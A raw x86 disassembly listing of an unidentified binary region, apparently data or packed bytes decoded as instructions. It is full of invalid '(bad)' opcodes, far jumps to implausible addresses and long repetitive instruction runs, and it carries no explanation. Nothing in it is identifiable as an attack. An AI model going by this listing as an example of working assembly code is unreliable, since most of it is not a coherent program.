  4072f5:	adc    edi,DWORD PTR [ecx+0x4b]
  4072f8:	loope  0x40729f
  4072fa:	inc    ebp
  4072fb:	jge    0x407294
  4072fd:	xchg   edi,eax
  4072fe:	xchg   esp,eax
  4072ff:	call   0xf763b0d
  407304:	lods   al,BYTE PTR ds:[esi]
  407305:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407306:	sti    
  407307:	lfs    esp,FWORD PTR [esi-0x5944089d]
  40730e:	imul   esi,edi,0xffffffc3
  407311:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407312:	arpl   di,si
  407314:	retf   
  407315:	xchg   al,bl
  407317:	pop    edx
  407318:	rol    eax,0x32
  40731b:	out    0x67,al
  40731d:	or     al,al
  40731f:	cmp    DWORD PTR [ebp+ebx*4+0x41],ebx
  407323:	adc    esp,DWORD PTR [ebx-0x10]
  407326:	icebp  
  407327:	repz sbb cl,BYTE PTR [ecx-0x6c]
  40732b:	adc    eax,0xa40928de
  407330:	stos   DWORD PTR es:[edi],eax
  407331:	arpl   bx,bx
  407333:	stc    
  407334:	mov    bl,0x4b
  407336:	sar    ecx,cl
  407338:	mov    ebx,0xc3fa6b43
  40733d:	dec    ebx
  40733e:	pop    ss
  40733f:	sti    
  407340:	push   edi
  407341:	add    BYTE PTR [eax],al
  407343:	add    BYTE PTR [eax],al
  407345:	add    BYTE PTR [edx-0x29],al
  407348:	ds retf 
  40734a:	mov    dh,0xf0
  40734c:	mov    eax,0x9602e785
  407351:	jle    0x4073ad
  407353:	inc    edx
  407354:	loope  0x4072f7
  407356:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407357:	dec    ebp
  407358:	sub    al,0x45
  40735a:	cld    
  40735b:	mov    al,BYTE PTR [ebp-0x26]
  40735e:	sub    edx,ecx
  407360:	xor    al,0x89
  407362:	pop    esi
  407363:	stc    
  407364:	call   0x5142e8ec
  407369:	add    al,0x75
  40736b:	add    al,BYTE PTR [ecx+0x58fcdefe]
  407371:	(bad)  
  407372:	out    0xfc,al
  407374:	pusha  
  407375:	(bad)  
  407376:	fwait
  407377:	cmp    BYTE PTR [edi],bh
  407379:	rcr    DWORD PTR [ebp+0x171e7d7a],0xf9
  407380:	mov    al,ds:0x88985d15
  407385:	xchg   DWORD PTR [edx+0x34],esp
  407388:	xchg   esp,eax
  407389:	clc    
  40738a:	sahf   
  40738b:	mov    al,0x3f
  40738d:	ret    0xdffd
  407390:	fdivr  st,st(5)
  407392:	out    0xfc,al
  407394:	loopne 0x407393
  407396:	fdivp  st(4),st
  407398:	in     al,0xfe
  40739a:	cmp    bl,0xf4
  40739d:	(bad)  
  40739e:	(bad)  
  40739f:	sti    
  4073a0:	in     al,0xfe
  4073a2:	(bad)  
  4073a3:	leave  
  4073a4:	mov    dh,0x99
  4073a6:	aas    
  4073a7:	mov    cl,0x6
  4073a9:	mov    esp,0x0
  4073ae:	add    BYTE PTR [esi+eax*1+0x6c],ch
  4073b2:	xchg   esp,eax
  4073b3:	mov    ds:0x9819b15d,al
  4073b8:	dec    esi
  4073b9:	inc    esi
  4073ba:	lock mov ah,0xbb
  4073bd:	sub    DWORD PTR [ecx-0x1815793],edx
  4073c3:	(bad)  
  4073c5:	nop
  4073c6:	(bad)  
  4073c7:	and    bh,dh
  4073c9:	add    al,0x0
  4073cb:	or     eax,0x7504fffe
  4073d0:	cmp    BYTE PTR [ecx+eiz*2],0x6a
  4073d4:	mov    edi,DWORD PTR [edx+edi*8]
  4073d7:	cs ins BYTE PTR es:[edi],dx
  4073d9:	xor    BYTE PTR [edx-0x8334664],ch
  4073df:	push   ebp
  4073e0:	mov    ds,WORD PTR [ebx-0x5e]
  4073e3:	xor    BYTE PTR [ebp-0x19],al
  4073e6:	dec    ebp
  4073e7:	or     DWORD PTR ds:0x170aec71,eax
  4073ed:	mov    edi,0x3c474bee
  4073f2:	sbb    eax,0x153c4f2a
  4073f7:	and    ch,BYTE PTR [ebx-0x518a66c4]
  4073fd:	cmp    eax,0x27499
  407402:	jmp    0xd9a3ef44
  407407:	push   esi
  407408:	pop    esi
  407409:	jmp    0x28e4:0x7650ab24
  407410:	sub    eax,0x8057
  407415:	add    BYTE PTR [eax],al
  407417:	add    dh,cl
  407419:	in     al,0xf6
  40741b:	push   0x4
  40741d:	jl     0x407465
  40741f:	fmul   DWORD PTR [ebp-0x304ec9c1]
  407425:	add    dh,BYTE PTR [edi]
  407427:	gs leave 
  407429:	mov    ebx,0x2475843b
  40742e:	cmp    al,0xb6
  407430:	jne    0x40744c
  407432:	cmp    eax,0xf73cb20b
  407437:	and    ebx,DWORD PTR [edi+0x656d159a]
  40743d:	or     DWORD PTR [eax+0x21],edx
  407440:	mov    ds:0x5d5a2fed,al
  407445:	jp     0x40742e
  407447:	aaa    
  407448:	or     eax,0xf0055ce
  40744d:	or     BYTE PTR [eax+0x35],al
  407450:	sbb    al,0x6
  407452:	add    BYTE PTR [eax],al
  407454:	pusha  
  407455:	xor    dl,BYTE PTR [edx]
  407457:	xor    BYTE PTR [esi],dh
  407459:	xor    ch,BYTE PTR [edi]
  40745b:	xor    BYTE PTR [edx],dl
  40745d:	xor    ah,BYTE PTR [ebp+0x30]
  407460:	iret   
  407461:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  407463:	repnz fwait
  407465:	les    ecx,FWORD PTR [eax+0x28]
  407468:	ftst   
  40746a:	popa   
  40746b:	test   DWORD PTR [esi],ecx
  40746d:	inc    ecx
  40746e:	icebp  
  40746f:	sub    al,0xb4
  407471:	js     0x407498
  407473:	ins    BYTE PTR es:[edi],dx
  407474:	pop    edx
  407475:	or     eax,0x6fc772ce
  40747a:	push   ebx
  40747b:	and    eax,0x0
  407480:	add    cl,bl
  407482:	xor    al,0x65
  407484:	xor    eax,0x35c635bb
  407489:	dec    edi
  40748a:	xor    eax,0x3bf435e3
  40748f:	jno    0x4074c7
  407491:	hlt    
  407492:	cmp    eax,DWORD PTR [edx-0x10e221ca]
  407498:	div    ebx
  40749a:	scas   eax,DWORD PTR es:[edi]
  40749b:	cwde   
  40749c:	mov    dh,0x67
  40749e:	xor    al,0x3b
  4074a0:	and    al,0x4b
  4074a2:	pop    ecx
  4074a3:	js     0x407509
  4074a5:	xchg   ecx,eax
  4074a6:	out    0x1b,eax
  4074a8:	(bad)  
  4074a9:	dec    esi
  4074aa:	mov    dh,0xcd
  4074ac:	xchg   DWORD PTR [ecx+ebx*1],edx
  4074af:	inc    ebp
  4074b0:	aaa    
  4074b1:	and    al,0x3b
  4074b3:	jns    0x4074ec
  4074b5:	dec    edi
  4074b6:	cmp    cl,BYTE PTR [ebp+0x533aeb37]
  4074bc:	cmp    BYTE PTR [eax+0x3e],ah
  4074bf:	xchg   ebp,eax
  4074c0:	cmp    cl,bl
  4074c2:	mov    dh,0xfa
  4074c4:	xchg   BYTE PTR [ecx],dl
  4074c6:	push   ss
  4074c7:	repz push esi
  4074c9:	jne    0x407532
  4074cb:	push   esi
  4074cc:	(bad)  
  4074cd:	pop    edi
  4074ce:	outs   dx,DWORD PTR ds:[esi]
  4074cf:	sbb    eax,0x3cffd2af
  4074d4:	and    bl,BYTE PTR [ebx+0x3f3f8945]
  4074da:	scas   al,BYTE PTR es:[edi]
  4074db:	outs   dx,BYTE PTR ds:[esi]
  4074dc:	fisubr DWORD PTR [ebx-0x5d01ffb6]
  4074e2:	sub    esi,DWORD PTR [ebx+0x0]
  4074e5:	add    BYTE PTR [eax],al
  4074e7:	add    BYTE PTR [eax],al
  4074e9:	add    BYTE PTR [ebp-0x4d],dh
  4074ec:	add    al,BYTE PTR [eax]
  4074ee:	jne    0x40751e
  4074f0:	repz push cs
  4074f2:	test   DWORD PTR [ebx-0x3d],eax
  4074f5:	pop    edi
  4074f6:	in     al,0x72
  4074f8:	nop
  4074f9:	jp     0x4074e8
  4074fb:	adc    eax,0x2825d9dc
  407500:	addr16 ss cmp dh,dl
  407504:	sahf   
  407505:	sti    
  407506:	in     al,0xf4
  407508:	js     0x4074d1
  40750a:	cmp    eax,0x4425fcde
  40750f:	dec    esi
  407510:	cmc    
  407511:	lods   al,BYTE PTR ds:[esi]
  407512:	call   0x105d:0x5962ca76
  407519:	imul   esp,DWORD PTR [edx+0x22],0x859aa9fb
  407520:	sahf   
  407521:	sbb    BYTE PTR [esp+esi*1+0x5a],cl
  407525:	push   ss
  407526:	mov    gs,WORD PTR [edx]
  407528:	jns    0x407557
  40752a:	imul   ebp,DWORD PTR [eax+0x678d59a0],0xffffffa2
  407531:	fimul  WORD PTR [edx+edi*4-0x15faac52]
  407538:	mov    eax,0xc974c9
  40753d:	mov    al,0x26
  40753f:	(bad)  
  407541:	sbb    eax,0xb5ad8834
  407546:	add    BYTE PTR [edx],al
  407548:	jp     0x4074d9
  40754a:	cmp    edx,edx
  40754c:	in     eax,dx
  40754d:	sub    al,0x0
  40754f:	add    BYTE PTR [eax],al
  407551:	add    BYTE PTR [eax],al
  407553:	fcomp  DWORD PTR [ecx]
  407555:	jns    0x4075a2
  407557:	push   eax
  407558:	jmp    0x564c049f
  40755d:	(bad)  
  40755e:	call   0xf960188c
  407563:	sub    al,0xfd
  407565:	sti    
  407566:	(bad)  
  407567:	mov    ebp,0xb8feaefb
  40756c:	sti    
  40756d:	xchg   edi,edi
  40756f:	push   esi
  407570:	cld    
  407571:	into   
  407572:	and    ebp,eax
  407574:	mov    dh,0xc
  407576:	push   esp
  407577:	cmp    eax,0xcdf1a45a
  40757c:	pop    ss
  40757d:	xchg   edi,eax
  40757e:	cmp    eax,0x3468487b
  407583:	imul   edx,DWORD PTR [edx-0x58],0x4e
  407587:	(bad)  
  407588:	call   0xb0bc844a
  40758d:	cmc    
  40758e:	jmp    0x5240:0xda474d3d
  407595:	jmp    0x4072:0xa732853b
  40759c:	cmc    
  40759d:	add    esi,DWORD PTR [ebp-0x7b]
  4075a0:	ret    
  4075a1:	mov    eax,0xf5e6653e
  4075a6:	dec    edx
  4075a7:	pop    edx
  4075a8:	leave  
  4075a9:	iret   
  4075aa:	in     eax,0xd3
  4075ac:	adc    edx,esp
  4075ae:	xchg   edx,eax
  4075af:	push   0x1a
  4075b1:	shr    cl,1
  4075b3:	jge    0x407560
  4075b5:	dec    eax
  4075b6:	xchg   esi,eax
  4075b7:	add    BYTE PTR [eax],al
  4075b9:	add    BYTE PTR [eax],al
  4075bb:	add    BYTE PTR [ebx-0x7],al
  4075be:	pop    esi
  4075bf:	adc    BYTE PTR [esp+esi*4],al
  4075c2:	sbb    ebp,DWORD PTR [edx-0x3a]
  4075c5:	push   cs
  4075c6:	inc    ebx
  4075c7:	sbb    DWORD PTR [esi+0xa1dffaf],ebx
  4075cd:	aad    0x2c
  4075cf:	repnz xchg ebx,eax
  4075d1:	in     al,0x8e
  4075d3:	btr    DWORD PTR [ebx+0x68c692e3],eax
  4075da:	add    cl,cl
  4075dc:	shl    DWORD PTR [edi],1
  4075de:	data16 mov al,0xbc
  4075e1:	lods   al,BYTE PTR ds:[esi]
  4075e2:	jmp    DWORD PTR [edi+0x62d5e243]
  4075e8:	fstp   QWORD PTR [edx+0x551b5eeb]
  4075ee:	and    cl,BYTE PTR [eax-0x22]
  4075f1:	ss in  al,0x7c
  4075f4:	daa    
  4075f5:	mov    ecx,0x9f40c4d5
  4075fa:	sub    al,0xbd
  4075fc:	out    dx,al
  4075fd:	rcl    al,1
  4075ff:	and    ah,ah
  407601:	adc    bh,BYTE PTR [eax+eiz*1]
  407604:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407605:	push   eax
  407606:	daa    
  407607:	das    
  407608:	ja     0x40761d
  40760a:	push   ecx
  40760b:	pushf  
  40760c:	inc    ebx
  40760d:	and    BYTE PTR [edi+0x6a7d110a],ch
  407613:	inc    eax
  407614:	pop    ebp
  407615:	push   es
  407616:	pop    ebx
  407617:	jle    0x4075ee
  407619:	jbe    0x4075af
  40761b:	cmp    esi,DWORD PTR [eax]
  40761d:	mov    ds:0xcca8,al
  407622:	add    BYTE PTR [eax],al
  407624:	add    BYTE PTR [ebx+0x2e5b973e],bh
  40762a:	neg    DWORD PTR [edi+edx*1]
  40762d:	xor    al,0x8a
  40762f:	popf   
  407630:	xor    DWORD PTR [edx-0xcc334c0],edi
  407636:	cmp    al,ah
  407638:	mov    ds:0x3d7639ee,eax
  40763d:	inc    esi
  40763e:	(bad)  
  40763f:	inc    edi
  407640:	sbb    eax,0x51383a95
  407645:	mov    ecx,0x2000e53f
  40764a:	test   eax,0xc4a929cc
  40764f:	test   BYTE PTR [ebp-0x7c],dl
  407652:	jae    0x407673
  407654:	lahf   
  407655:	clc    
  407656:	sbb    DWORD PTR [eax],eax
  407658:	call   0x97ad962e
  40765d:	sub    eax,0xd5b12362
  407662:	fsubr  DWORD PTR [edx+0x5e]
  407665:	pop    es
  407666:	or     DWORD PTR [ecx+0x4f8afce8],0xffffff8f
  40766d:	shl    bh,0xa5
  407670:	sbb    eax,0x6cf9874f
  407675:	push   edi
  407676:	inc    eax
  407677:	add    al,0xe1
  407679:	xor    al,0xfc
  40767b:	cwde   
  40767c:	sub    dl,BYTE PTR [eax-0x54406b0a]
  407682:	or     eax,0xe494e0d5
  407687:	pusha  
  407688:	fiadd  DWORD PTR [eax]
  40768a:	add    BYTE PTR [eax],al
  40768c:	add    BYTE PTR [eax],al
  40768e:	mov    edi,ebx
  407690:	stos   DWORD PTR es:[edi],eax
  407691:	jmp    0x407618
  407693:	adc    BYTE PTR [edi-0x45],0x30
  407697:	mov    DWORD PTR [ecx+eiz*4+0x5f],ecx
  40769b:	pusha  
  40769c:	fxch   st(2)
  40769e:	sbb    ecx,edi
  4076a0:	fwait
  4076a1:	mov    ebp,0xa376ba55
  4076a6:	jo     0x407701
  4076a8:	inc    edx
  4076a9:	mov    dl,0xef
  4076ab:	lahf   
  4076ac:	loop   0x40768c
  4076ae:	pop    ebx
  4076af:	ins    DWORD PTR es:[edi],dx
  4076b0:	adc    al,0xf3
  4076b2:	dec    ebx
  4076b3:	imul   edi,ebx,0x16
  4076b6:	js     0x40763b
  4076b8:	adc    BYTE PTR [ebp-0x53],bh
  4076bb:	adc    eax,0x1c8b332e
  4076c0:	ds std 
  4076c2:	out    dx,al
  4076c3:	int3   
  4076c4:	push   ebp
  4076c5:	adc    esi,DWORD PTR [ebp+0x10]
  4076c8:	add    al,0x1
  4076ca:	or     ebp,DWORD PTR ds:[ebp+0x48]
  4076ce:	out    dx,al
  4076cf:	push   esi
  4076d0:	xchg   esp,eax
  4076d1:	and    eax,ecx
  4076d3:	lds    edx,FWORD PTR [ebp+edx*2-0x15]
  4076d7:	pop    esp
  4076d8:	mov    ch,0xab
  4076da:	test   BYTE PTR [eax+0x2a845784],ah
  4076e0:	add    DWORD PTR [eax],eax
  4076e2:	jne    0x40770f
  4076e4:	add    eax,DWORD PTR [eax]
  4076e6:	jne    0x407715
  4076e8:	add    DWORD PTR [eax],eax
  4076ea:	jne    0x407719
  4076ec:	add    eax,DWORD PTR [eax]
  4076ee:	jne    0x40771a
  4076f0:	add    al,BYTE PTR [eax]
  4076f2:	add    BYTE PTR [eax],al
  4076f4:	add    BYTE PTR [eax],al
  4076f6:	add    BYTE PTR [ebp+0x1f],dh
  4076f9:	add    eax,DWORD PTR [eax]
  4076fb:	jne    0x40772a
  4076fd:	add    al,BYTE PTR [eax]
  4076ff:	jne    0x407722
  407701:	add    eax,DWORD PTR [eax]
  407703:	jne    0x407730
  407705:	add    eax,DWORD PTR [eax]
  407707:	jne    0x407734
  407709:	add    eax,DWORD PTR [eax]
  40770b:	jne    0x407738
  40770d:	add    eax,DWORD PTR [eax]
  40770f:	jne    0x40773c
  407711:	add    eax,DWORD PTR [eax]
  407713:	jne    0x407740
  407715:	add    eax,DWORD PTR [eax]
  407717:	jne    0x407744
  407719:	add    eax,DWORD PTR [eax]
  40771b:	jne    0x407748
  40771d:	add    eax,DWORD PTR [eax]
  40771f:	jne    0x40774c
  407721:	add    eax,DWORD PTR [eax]
  407723:	jne    0x407750
  407725:	loop   0x407726
  407727:	push   edi
  407728:	aas    
  407729:	out    0x25,al
  40772b:	push   edx
  40772c:	sub    eax,DWORD PTR [ebx]
  40772e:	sub    cl,BYTE PTR [esi+0x2b]
  407731:	out    dx,al
  407732:	sub    eax,0x31f27b75
  407737:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407738:	outs   dx,DWORD PTR ds:[esi]
  407739:	div    BYTE PTR ds:0xfffa73a2
  40773f:	loop   0x40776b
  407741:	add    eax,DWORD PTR [eax]
  407743:	jne    0x407747
  407745:	jmp    0x44e5cbee
  40774a:	mov    eax,ds:0xad40a150
  40774f:	dec    esp
  407750:	lods   eax,DWORD PTR ds:[esi]
  407751:	cmp    al,0xa9
  407753:	dec    eax
  407754:	test   eax,0xb524b538
  407759:	xor    al,0xb1
  40775b:	add    BYTE PTR [eax],al
  40775d:	add    BYTE PTR [eax],al
  40775f:	add    BYTE PTR [eax],ah
  407761:	mov    cl,0x30
  407763:	mov    ebp,0x3e9021c
  407768:	cmp    ebx,ecx
  40776a:	or     BYTE PTR [ebp-0x5efb5aec],ah
  407770:	adc    BYTE PTR [ecx-0x52f35300],ah
  407776:	cld    
  407777:	test   al,0x8
  407779:	test   eax,0xb3e4b4f8
  40777e:	hlt    
  40777f:	mov    al,0xe0
  407781:	scas   eax,DWORD PTR es:[edi]
  407782:	lock mov esp,0x3ed02dc
  407788:	fild   DWORD PTR [edx]
  40778a:	jmp    0xe942ec92
  40778f:	add    esi,DWORD PTR [ebp+0x2]
  407792:	jmp    0xe942ec9a
  407797:	add    esi,DWORD PTR [ebp+0x2]
  40779a:	jmp    0xe942eca2
  40779f:	add    esi,DWORD PTR [ebp+0x2]
  4077a2:	jmp    0xe942ecaa
  4077a7:	add    esi,DWORD PTR [ebp+0x2]
  4077aa:	jmp    0xe942ecb2
  4077af:	add    esi,DWORD PTR [ebp+0x2]
  4077b2:	jmp    0xe942ecba
  4077b7:	add    esi,DWORD PTR [ebp+0x2]
  4077ba:	jmp    0xe942ecc2
  4077bf:	add    esi,DWORD PTR [ebp+0x2]
  4077c2:	add    cl,ch
  4077c4:	add    BYTE PTR [eax],al
  4077c6:	add    BYTE PTR [eax],al
  4077c8:	add    BYTE PTR [esi+0x2],dh
  4077cb:	add    cl,ch
  4077cd:	jbe    0x4077d1
  4077cf:	add    cl,ch
  4077d1:	jbe    0x4077d5
  4077d3:	add    cl,ch
  4077d5:	jbe    0x4077d9
  4077d7:	add    cl,ch
  4077d9:	jbe    0x4077dd
  4077db:	add    cl,ch
  4077dd:	jbe    0x4077e1
  4077df:	add    cl,ch
  4077e1:	jbe    0x4077e5
  4077e3:	add    cl,ch
  4077e5:	jbe    0x4077e9
  4077e7:	add    cl,ch
  4077e9:	jbe    0x4077ed
  4077eb:	add    cl,ch
  4077ed:	jbe    0x4077f1
  4077ef:	add    cl,ch
  4077f1:	jbe    0x4077f5
  4077f3:	add    cl,ch
  4077f5:	jbe    0x4077f9
  4077f7:	add    cl,ch
  4077f9:	jbe    0x4077fd
  4077fb:	add    cl,ch
  4077fd:	jbe    0x407801
  4077ff:	add    cl,ch
  407801:	jbe    0x407805
  407803:	add    cl,ch
  407805:	jbe    0x407809
  407807:	add    cl,ch
  407809:	jbe    0x40780d
  40780b:	add    cl,ch
  40780d:	jbe    0x407811
  40780f:	add    BYTE PTR [esi-0x71],ah
  407812:	aaa    
  407813:	call   FWORD PTR [esi-0x71]
  407816:	aaa    
  407817:	call   DWORD PTR [esi+0x7f]
  40781a:	aaa    
  40781b:	dec    DWORD PTR [esi+0x7f]
  40781e:	aaa    
  40781f:	inc    DWORD PTR [esi+0x6f]
  407822:	aaa    
  407823:	(bad)  
  407824:	outs   dx,DWORD PTR ds:[esi]
  407826:	aaa    
  407827:	push   DWORD PTR [esi]
  407829:	pop    edi
  40782a:	aaa    
  40782b:	jmp    FWORD PTR [esi]
  40782d:	add    BYTE PTR [eax],al
  40782f:	add    BYTE PTR [eax],al
  407831:	add    BYTE PTR [edi+0x37],bl
  407834:	jmp    DWORD PTR [esi]
  407836:	dec    edi
  407837:	aaa    
  407838:	call   FWORD PTR [esi]
  40783a:	dec    edi
  40783b:	aaa    
  40783c:	call   DWORD PTR [esi]
  40783e:	aas    
  40783f:	aaa    
  407840:	dec    DWORD PTR [esi]
  407842:	aas    
  407843:	aaa    
  407844:	inc    DWORD PTR [eax]
  407846:	fdiv   st(5),st
  407848:	add    DWORD PTR [ebx],eax
  40784a:	rol    BYTE PTR [ecx],1
  40784c:	push   es
  40784d:	pop    es
  40784e:	aam    0x5
  407850:	(bad)  
  407851:	dec    ebx
  407853:	clc    
  407854:	(bad)  
  407855:	(bad)  
  407856:	fild   DWORD PTR [edi]
  407858:	or     ecx,DWORD PTR [ecx+ebx*8]
  40785b:	or     BYTE PTR [edi],cl
  40785d:	jmp    FWORD PTR [ebx-0x54000108]
  407863:	clc    
  407864:	(bad)  
  407865:	(bad)  
  407866:	mov    ebx,0xebfffef8
  40786b:	clc    
  40786c:	(bad)  
  40786d:	(bad)  
  40786e:	jmp    0x407868
  407870:	(bad)  
  407871:	dec    ebx
  407873:	clc    
  407874:	(bad)  
  407875:	(bad)  
  407876:	fild   DWORD PTR [edi]
  407878:	or     ecx,DWORD PTR [ecx+ebx*4]
  40787b:	or     BYTE PTR [edi],cl
  40787d:	(bad)  
  40787e:	jmp    0x407878
  407880:	(bad)  
  407881:	(bad)  
  407882:	jmp    0x40787c
  407884:	(bad)  
  407885:	(bad)  
  407886:	sti    
  407887:	sti    
  407888:	(bad)  
  407889:	(bad)  
  40788a:	jmp    0x407887
  40788c:	(bad)  
  40788d:	(bad)  
  40788e:	jmp    0x40788b
  407890:	(bad)  
  407891:	dec    ebx
  407893:	sti    
  407894:	(bad)  
  407895:	inc    DWORD PTR [eax]
  407897:	add    BYTE PTR [eax],al
  407899:	add    BYTE PTR [eax],al
  40789b:	pop    esp
  40789c:	add    al,BYTE PTR [eax]
  40789e:	add    BYTE PTR [edx+eax*1+0x0],bl
  4078a2:	add    BYTE PTR [edx+eax*1+0x0],cl
  4078a6:	add    BYTE PTR [edx+eax*1+0x0],cl
  4078aa:	add    BYTE PTR [edx+eax*1],bl
  4078ad:	add    BYTE PTR [eax],al
  4078af:	sbb    al,0x2
  4078b1:	add    BYTE PTR [eax],al
  4078b3:	or     al,0x2
  4078b5:	add    BYTE PTR [eax],al
  4078b7:	or     al,0x2
  4078b9:	add    BYTE PTR [eax],al
  4078bb:	sbb    al,0x2
  4078bd:	add    BYTE PTR [eax],al
  4078bf:	sbb    al,0x2
  4078c1:	add    BYTE PTR [eax],al
  4078c3:	jne    0x4078f0
  4078c5:	add    eax,DWORD PTR [eax]
  4078c7:	jne    0x4078f4
  4078c9:	add    eax,DWORD PTR [eax]
  4078cb:	jne    0x4078f8
  4078cd:	add    eax,DWORD PTR [eax]
  4078cf:	jne    0x4078fc
  4078d1:	add    eax,DWORD PTR [eax]
  4078d3:	jne    0x407900
  4078d5:	add    eax,DWORD PTR [eax]
  4078d7:	jne    0x407904
  4078d9:	add    eax,DWORD PTR [eax]
  4078db:	jne    0x407908
  4078dd:	add    eax,DWORD PTR [eax]
  4078df:	jne    0x40790c
  4078e1:	add    eax,DWORD PTR [eax]
  4078e3:	jne    0x407910
  4078e5:	add    eax,DWORD PTR [eax]
  4078e7:	jne    0x407914
  4078e9:	add    eax,DWORD PTR [eax]
  4078eb:	jne    0x407918
  4078ed:	add    eax,DWORD PTR [eax]
  4078ef:	jne    0x40791c
  4078f1:	add    eax,DWORD PTR [eax]
  4078f3:	jne    0x407920
  4078f5:	add    eax,DWORD PTR [eax]
  4078f7:	jne    0x407924
  4078f9:	add    eax,DWORD PTR [eax]
  4078fb:	jne    0x407928
  4078fd:	add    eax,DWORD PTR [eax]
  4078ff:	add    BYTE PTR [eax],al
  407901:	add    BYTE PTR [eax],al
  407903:	add    BYTE PTR [ebp+0x2b],dh
  407906:	add    eax,DWORD PTR [eax]
  407908:	jne    0x407935
  40790a:	add    eax,DWORD PTR [eax]
  40790c:	jne    0x407939
  40790e:	add    eax,DWORD PTR [eax]
  407910:	jne    0x40793d
  407912:	add    eax,DWORD PTR [eax]
  407914:	jne    0x407941
  407916:	add    eax,DWORD PTR [eax]
  407918:	jne    0x407945
  40791a:	add    eax,DWORD PTR [eax]
  40791c:	jne    0x407949
  40791e:	add    eax,DWORD PTR [eax]
  407920:	jne    0x40794d
  407922:	add    eax,DWORD PTR [eax]
  407924:	jne    0x407951
  407926:	add    eax,DWORD PTR [eax]
  407928:	jne    0x407955
  40792a:	add    eax,DWORD PTR [eax]
  40792c:	jne    0x407959
  40792e:	add    eax,DWORD PTR [eax]
  407930:	jne    0x40795d
  407932:	add    eax,DWORD PTR [eax]
  407934:	jne    0x407961
  407936:	add    eax,DWORD PTR [eax]
  407938:	jne    0x407965
  40793a:	add    eax,DWORD PTR [eax]
  40793c:	jne    0x407969
  40793e:	add    eax,DWORD PTR [eax]
  407940:	jne    0x407944
  407942:	jmp    0xe842ed49
  407947:	add    dh,BYTE PTR [ebx+eax*1-0x18]
  40794b:	add    dh,BYTE PTR [ebx+eax*1-0x18]
  40794f:	add    dh,BYTE PTR [ebx+eax*1-0x18]
  407953:	add    dh,BYTE PTR [ebx+eax*1-0x18]
  407957:	add    dh,BYTE PTR [ebx+eax*1-0x18]
  40795b:	add    dh,BYTE PTR [ebx+eax*1-0x18]
  40795f:	add    dh,BYTE PTR [edx+eax*1-0x18]
  407963:	add    al,0x74
  407965:	add    ebp,eax
  407967:	add    al,0x0
  407969:	add    BYTE PTR [eax],al
  40796b:	add    BYTE PTR [eax],al
  40796d:	je     0x407972
  40796f:	call   0xe843ed78
  407974:	add    al,0x74
  407976:	add    ebp,eax
  407978:	add    al,0x74
  40797a:	add    ebp,eax
  40797c:	add    al,0x74
  40797e:	add    ebp,eax
  407980:	add    al,0x74
  407982:	add    ebp,eax
  407984:	add    al,0x74
  407986:	add    ebp,eax
  407988:	add    al,0x74
  40798a:	add    ebp,eax
  40798c:	add    al,0x74
  40798e:	add    ebp,eax
  407990:	add    al,0x74
  407992:	add    ebp,eax
  407994:	add    al,0x74
  407996:	add    eax,ebp
  407998:	add    al,0x74
  40799a:	add    eax,ebp
  40799c:	add    al,0x74
  40799e:	add    eax,ebp
  4079a0:	add    al,0x74
  4079a2:	add    eax,ebp
  4079a4:	add    al,0x74
  4079a6:	add    ch,cl
  4079a8:	add    esi,DWORD PTR [ebp+0x2]
  4079ab:	jmp    0xe942eeb3
  4079b0:	add    esi,DWORD PTR [ebp+0x2]
  4079b3:	jmp    0xe942eebb
  4079b8:	add    esi,DWORD PTR [ebp+0x2]
  4079bb:	jmp    0x42eec3
  4079c0:	jmp    0xe9407c3b
  4079c5:	jbe    0x4079c9
  4079c7:	add    cl,ch
  4079c9:	jbe    0x4079cd
  4079cb:	add    cl,ch
  4079cd:	jbe    0x4079d1
  4079cf:	add    cl,ch
  4079d1:	add    BYTE PTR [eax],al
  4079d3:	add    BYTE PTR [eax],al
  4079d5:	add    BYTE PTR [esi+0x2],dh
  4079d8:	add    cl,ch
  4079da:	jbe    0x4079de
  4079dc:	add    cl,ch
  4079de:	jbe    0x4079e2
  4079e0:	add    cl,ch
  4079e2:	jbe    0x4079e6
  4079e4:	add    cl,ch
  4079e6:	jbe    0x4079ea
  4079e8:	add    cl,ch
  4079ea:	jbe    0x4079ee
  4079ec:	add    cl,ch
  4079ee:	jbe    0x4079f2
  4079f0:	add    cl,ch
  4079f2:	jbe    0x4079f6
  4079f4:	add    cl,ch
  4079f6:	jbe    0x4079fa
  4079f8:	add    cl,ch
  4079fa:	jbe    0x4079fe
  4079fc:	add    cl,ch
  4079fe:	jbe    0x407a02
  407a00:	add    cl,ch
  407a02:	jbe    0x407a06
  407a04:	add    cl,ch
  407a06:	jbe    0x407a0a
  407a08:	add    cl,ch
  407a0a:	jbe    0x407a0e
  407a0c:	add    cl,ch
  407a0e:	jbe    0x407a12
  407a10:	add    cl,ch
  407a12:	jbe    0x407a16
  407a14:	add    cl,ch
  407a16:	jbe    0x407a1a
  407a18:	add    cl,ch
  407a1a:	jbe    0x407a1e
  407a1c:	add    cl,ch
  407a1e:	jbe    0x407a22
  407a20:	add    cl,ch
  407a22:	jbe    0x407a26
  407a24:	add    cl,ch
  407a26:	jbe    0x407a2a
  407a28:	add    cl,ch
  407a2a:	jbe    0x407a2e
  407a2c:	add    cl,ch
  407a2e:	jno    0x407a30
  407a30:	add    esp,ebp
  407a32:	jne    0x407a30
  407a34:	push   es
  407a35:	loope  0x407aa0
  407a37:	or     BYTE PTR [ebx],cl
  407a39:	fld    QWORD PTR [eax]
  407a3b:	add    BYTE PTR [eax],al
  407a3d:	add    BYTE PTR [eax],al
  407a3f:	jge    0x407a45
  407a41:	str    WORD PTR [esi+ecx*1+0x12]
  407a46:	adc    ecx,DWORD PTR [eax+0x12]
  407a49:	push   ss
  407a4a:	pop    ss
  407a4b:	inc    esp
  407a4c:	push   ss
  407a4d:	sbb    bl,BYTE PTR [ebx]
  407a4f:	inc    eax
  407a50:	sbb    bl,BYTE PTR [esi]
  407a52:	pop    ds
  407a53:	cmp    al,0x1e
  407a55:	and    DWORD PTR [ebx],esp
  407a57:	cmp    BYTE PTR [edx],ah
  407a59:	and    eax,0x29263427
  407a5e:	sub    esi,DWORD PTR [eax]
  407a60:	sub    ch,BYTE PTR ds:0x312e2c2f
  407a66:	xor    ebp,DWORD PTR [eax]
  407a68:	xor    dh,BYTE PTR ds:0x39362437
  407a6e:	cmp    esp,DWORD PTR [eax]
  407a70:	cmp    bh,BYTE PTR ds:0x615f9c3f
